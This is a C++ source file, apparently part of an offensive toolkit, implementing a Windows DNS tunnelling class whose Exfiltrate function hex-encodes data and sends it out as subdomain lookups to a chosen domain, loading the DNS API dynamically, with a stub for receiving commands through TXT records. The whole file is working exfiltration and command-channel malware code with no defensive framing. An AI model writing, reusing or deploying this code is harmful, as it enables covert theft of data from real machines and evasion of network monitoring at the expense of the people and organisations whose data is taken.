#include "exfil/dns_tunnel.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>

// Windows DNS API Definitions
typedef struct _DNS_RECORD {
    struct _DNS_RECORD *pNext;
    LPSTR               pName;
    WORD                wType;
    WORD                wDataLength;
    union {
        DWORD           DW;
        struct {
            DWORD       dwStringCount;
            LPSTR       *pStringArray;
        } TXT;
    } Data;
} DNS_RECORD, *PDNS_RECORD;

#define DNS_TYPE_A      0x0001
#define DNS_QUERY_STANDARD 0x00000000

typedef int (WINAPI *DnsQuery_A_t)(PCSTR, WORD, DWORD, PVOID, PDNS_RECORD*, PVOID);
typedef void (WINAPI *DnsRecordListFree_t)(PDNS_RECORD, int);

// Simple Base32 or Hex encoding for DNS safety
std::string ToHex(const std::string& input) {
    std::stringstream ss;
    for(unsigned char c : input) ss << std::hex << std::setw(2) << std::setfill('0') << (int)c;
    return ss.str();
}

DNSTunnel::DNSTunnel(const std::string& d) : domain(d) {}
DNSTunnel::~DNSTunnel() {}

bool DNSTunnel::Exfiltrate(const std::string& data) {
    HMODULE hDnsApi = LoadLibraryA("dnsapi.dll");
    if(!hDnsApi) return false;
    
    auto pDnsQuery_A = (DnsQuery_A_t)GetProcAddress(hDnsApi, "DnsQuery_A");
    auto pDnsRecordListFree = (DnsRecordListFree_t)GetProcAddress(hDnsApi, "DnsRecordListFree");
    
    if(!pDnsQuery_A || !pDnsRecordListFree) { FreeLibrary(hDnsApi); return false; }

    // REAL Logic:
    // 1. Encode data (Hex)
    // 2. Construct subdomain: <hex_data>.<domain>
    // 3. Send Query
    
    std::string encoded = ToHex(data);
    
    // DNS limit is 63 chars per label, 255 total. We must chunk it.
    // For simplicity, we just take the first 60 chars (30 bytes of data)
    // Real implementation would split into multiple queries/sequence numbers.
    if(encoded.length() > 60) encoded = encoded.substr(0, 60); 
    
    std::string fullQuery = encoded + "." + domain;

    PDNS_RECORD pResults = NULL;
    // Perform the actual DNS Query to the OS's default resolver
    // This sends the packet out to the internet
    int status = pDnsQuery_A(fullQuery.c_str(), DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pResults, NULL);
    
    if(pResults) pDnsRecordListFree(pResults, 1); // Free memory using the newly loaded function pointer
    FreeLibrary(hDnsApi);
    return (status == 0); // 0 is success in WinAPI usually
}

std::string DNSTunnel::ReceiveCommand() {
    // Receiving via TXT records requires polling.
    // Placeholder for now as user focused on sending.
    return "";
}